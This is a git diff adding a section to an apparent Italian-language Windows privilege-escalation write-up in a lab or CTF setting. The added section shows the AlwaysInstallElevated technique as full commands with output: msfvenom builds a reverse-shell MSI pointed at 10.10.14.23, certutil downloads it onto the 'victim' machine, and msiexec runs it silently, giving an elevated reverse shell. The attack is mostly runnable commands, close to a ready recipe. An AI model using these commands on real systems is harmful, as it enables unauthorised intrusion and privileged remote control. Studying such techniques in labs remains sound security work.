@@ -98,3 +98,42 @@ Copio la mia solita reverse shell, mi metto in ascolto sulla porta e faccio part
 
 
 ![Unquoted Service Path - Powershell](/assets/img/posts/privesc-windows/unquoted_path3.png)
+
+
+
+-------
+
+vedi C:\ProgramFiles\SystemScheduler\WScheduler.exe se ha permessi di scrittura
+
+
+#### AlwaysInstallElevated
+https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+
+In locale:
+```
+(base) ┌──(kali㉿kali)-[~/Programs/PowerTools/PowerUp]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.23 LPORT=5040 -f msi -o reverse.msi
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of msi file: 159744 bytes
+Saved as: reverse.msi
+```
+
+Nella macchina vittima:
+```
+C:\Users\Phoebe\Desktop>certutil -urlcache -split -f "http://10.10.14.23/reverse.msi" rev.msi
+certutil -urlcache -split -f "http://10.10.14.23/reverse.msi" rev.msi
+
+****  Online  ****
+  000000  ...
+  027000
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\Phoebe\Desktop>
+C:\Users\Phoebe\Desktop>msiexec /quiet /qn /i rev.msi
+msiexec /quiet /qn /i rev.msi
+```
+
+E mettere in listening e si ha una reverse shell con privilegi.
